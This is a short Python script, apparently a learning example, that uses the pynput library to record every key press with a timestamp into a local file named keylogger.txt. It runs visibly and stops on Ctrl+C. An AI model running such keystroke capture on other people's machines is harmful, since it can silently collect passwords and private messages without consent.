from pynput import keyboard
from datetime import datetime

log_file = "keylogger.txt"

def format_key(key):
    try:
        return key.char
    except AttributeError:

        key_mapping = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.ctrl_l: "[CTRL]",
            keyboard.Key.ctrl_r: "[CTRL]",
            keyboard.Key.alt_l: "[ALT]",
            keyboard.Key.alt_r: "[ALT]",
            keyboard.Key.delete: "[DEL]"
        }
        return key_mapping.get(key, f"[{key.name.upper()}]")


def on_press(key):
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    key_str = format_key(key)
    with open(log_file, "a") as f:
        f.write(f"{time} - {key_str}\n")

print("Key logger with timestamps running, Press CTRL + C to stop")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()